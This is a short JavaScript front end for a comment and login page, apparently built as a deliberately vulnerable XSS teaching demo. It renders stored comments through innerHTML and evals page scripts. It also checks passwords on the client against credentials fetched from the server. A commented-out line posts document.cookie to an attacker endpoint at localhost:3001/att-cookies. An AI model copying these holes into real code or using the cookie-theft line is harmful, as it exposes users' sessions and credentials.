let username, comment

fetch('/cookies', {
  method: 'GET',
})
  .then(res => res.json())
  .then(data => {
    username = data.cookies.username
    password = data.cookies.password
    comment = data.cookies.comment
    document.getElementById("showComment").innerHTML = comment

    let arr = document.getElementsByTagName('script')
    for (let n = 0; n < arr.length; n++)
      eval(arr[n].innerHTML)
  })
  .catch(err => console.log(err))

document.getElementById("submitComment").onsubmit = () => {
  comment = document.getElementById("comment").value

  fetch('/comment', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      "comment": comment
    })
  })
  .then(res => res.json())
  .then(body => {
    console.log(body);
  })
  .catch(err => {
    console.log(err);
  })
}

document.getElementById("login").onsubmit = e => {
  e.preventDefault()

  fetch('/login', {
    method: 'GET'
  })
    .then(res => res.json())
    .then(body => {
      username = body.username
      password = body.password

      if (document.getElementById("username").value == username && document.getElementById("password").value == password) {
        alert("Login Sukses")
      } else {
        alert("Login Gagal :(")
      }
    })
    .catch(err => {
      console.log(err);
    })
}

document.getElementById("signup").onclick = e => {
  fetch('/signup', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      "username": document.getElementById("username").value,
      "password": document.getElementById("password").value
    })
  })
    .then(res => res.json())
    .then(body => {
      console.log(body);
    })
    .catch(err => {
      console.log(err);
    })
}

// fetch('http://localhost:3001/att-cookies', {
//   method: 'POST',
//   headers: {
//     'Content-Type': 'application/json',
//   },
//   body: JSON.stringify({ cookie: document.cookie })
// })